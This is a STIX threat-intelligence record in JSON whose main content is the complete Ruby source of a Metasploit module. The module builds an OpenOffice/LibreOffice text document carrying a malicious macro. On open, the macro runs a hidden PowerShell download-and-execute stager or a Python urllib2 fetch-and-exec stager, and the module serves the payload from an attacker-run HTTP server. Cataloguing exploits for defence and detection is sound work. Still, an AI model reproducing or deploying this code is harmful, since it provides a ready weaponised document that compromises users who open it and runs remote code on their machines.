{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f0949a6-de94-47cb-809f-7d284082a2df",
    "created": "2024-08-14T17:06:52.964873Z",
    "modified": "2024-08-14T17:06:52.964877Z",
    "name": "\"Apache OpenOffice Text Document Malicious Macro Execution\"",
    "description": " This module generates an Apache OpenOffice Text Document with a malicious macro in it. To exploit successfully, the targeted user must adjust the security level in Macro Security to either Medium or Low. If set to Medium, a prompt is presented to the user to enable or disable the macro. If set to Low, the macro can automatically run without any warning.  The module also works against LibreOffice.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/openoffice_document_macro.rb",
            "external_id": "openoffice_document_macro.rb"
        },
        {
            "source_name": "reference",
            "url": "https://en.wikipedia.org/wiki/Macro_virus"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\nrequire 'cgi'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::Remote::HttpServer\n\n  WINDOWSGUI = 'windows'\n  OSXGUI     = 'osx'\n  LINUXGUI   = 'linux'\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Apache OpenOffice Text Document Malicious Macro Execution\",\n      'Description'    => %q{\n        This module generates an Apache OpenOffice Text Document with a malicious macro in it.\n        To exploit successfully, the targeted user must adjust the security level in Macro\n        Security to either Medium or Low. If set to Medium, a prompt is presented to the user\n        to enable or disable the macro. If set to Low, the macro can automatically run without\n        any warning.\n\n        The module also works against LibreOffice.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sinn3r' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://en.wikipedia.org/wiki/Macro_virus']\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n          'DisablePayloadHandler' => false\n        },\n      'Targets'        =>\n        [\n          [\n            'Apache OpenOffice on Windows (PSH)', {\n            'Platform' => 'win',\n            'Arch' => [ARCH_X86, ARCH_X64]\n          }],\n          [\n            'Apache OpenOffice on Linux/OSX (Python)', {\n            'Platform' => 'python',\n            'Arch' => ARCH_PYTHON\n          }]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-02-08'\n    ))\n\n    register_options([\n      OptString.new(\"BODY\", [false, 'The message for the document body', '']),\n      OptString.new('FILENAME', [true, 'The OpenOffice Text document name', 'msf.odt'])\n    ])\n  end\n\n\n  def on_request_uri(cli, req)\n    print_status(\"Sending payload\")\n\n    if target.name =~ /PSH/\n      p = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true, exec_in_place: true)\n    else\n      p = payload.encoded\n    end\n\n    send_response(cli, p,  'Content-Type' => 'application/octet-stream')\n  end\n\n\n  def primer\n    print_status(\"Generating our odt file for #{target.name}...\")\n    path  = File.join(Msf::Config.install_root, 'data', 'exploits', 'openoffice_document_macro')\n    docm = package_odt(path)\n    file_create(docm)\n  end\n\n\n  def get_windows_stager\n    %Q|Shell(\"cmd.exe /C \"\"#{generate_psh_stager}\"\"\")|\n  end\n\n\n  def get_unix_stager\n    %Q|Shell(\"#{generate_python_stager}\")|\n  end\n\n\n  def generate_psh_stager\n    @windows_psh_stager ||= lambda {\n      ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl\n      download_string = Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(get_uri)\n      download_and_run = \"#{ignore_cert}#{download_string}\"\n      generate_psh_command_line(\n        noprofile: true,\n        windowstyle: 'hidden',\n        command: download_and_run)\n    }.call\n  end\n\n\n  def generate_python_stager\n    @python_stager ||= lambda {\n      %Q|python -c \"\"import urllib2; r = urllib2.urlopen('#{get_uri}'); exec(r.read());\"\"|\n    }.call\n  end\n\n\n  def get_statger\n    case target.name\n    when /PSH/\n      get_windows_stager\n    when /Python/\n      get_unix_stager\n    end\n  end\n\n\n  # This macro code has the following in mind:\n  # 1. It checks the platform to eliminate less misfires. Since we have only tested on Windows/Linux/OSX,\n  #    we only want to fire at those.\n  # 2. Originally, I tried to embed the payload in the macro code, write it out and then execute it.\n  #    This turned out to be problematic, because for some reason OpenOffice is not able to\n  #    write a large string to a file (I've tried either shell(\"echo\") or using the macro API).\n  #    The stager code is similar to web_delivery.\n  def macro_code\n    CGI.escapeHTML(%Q|\n    Sub OnLoad\n      Dim os as string\n      os = GetOS\n      If os = \"#{WINDOWSGUI}\" OR os = \"#{OSXGUI}\" OR os = \"#{LINUXGUI}\" Then\n        Exploit\n      end If\n    End Sub\n\n    Sub Exploit\n      #{get_statger}\n    End Sub\n\n    Function GetOS() as string\n      select case getGUIType\n        case 1:\n          GetOS = \"#{WINDOWSGUI}\"\n        case 3:\n          GetOS = \"#{OSXGUI}\"\n        case 4:\n          GetOS = \"#{LINUXGUI}\"\n      end select\n    End Function\n\n    Function GetExtName() as string\n      select case GetOS\n        case \"#{WINDOWSGUI}\"\n          GetFileName = \"exe\"\n        case else\n          GetFileName = \"bin\"\n      end select\n    End Function\n    |)\n  end\n\n  def on_file_read(short_fname, full_fname)\n    buf = File.read(full_fname)\n\n    case short_fname\n    when /content\\.xml/\n      buf.gsub!(/DOCBODYGOESHER/, datastore['BODY'])\n    when /Module1\\.xml/\n      buf.gsub!(/CODEGOESHERE/, macro_code)\n    end\n\n    yield short_fname, buf\n  end\n\n\n  def package_odt(path)\n    zip = Rex::Zip::Archive.new\n\n    Dir[\"#{path}/**/**\"].each do |file|\n      p = file.sub(path+'/','')\n\n      if File.directory?(file)\n        print_status(\"Packaging directory: #{file}\")\n        zip.add_file(p)\n      else\n        on_file_read(p, file) do |fname, buf|\n          print_status(\"Packaging file: #{fname}\")\n          zip.add_file(fname, buf)\n        end\n      end\n    end\n\n    zip.pack\n  end\n\n\n  def exploit\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-02-08",
    "x_mitre_platforms": [
        "python'"
    ]
}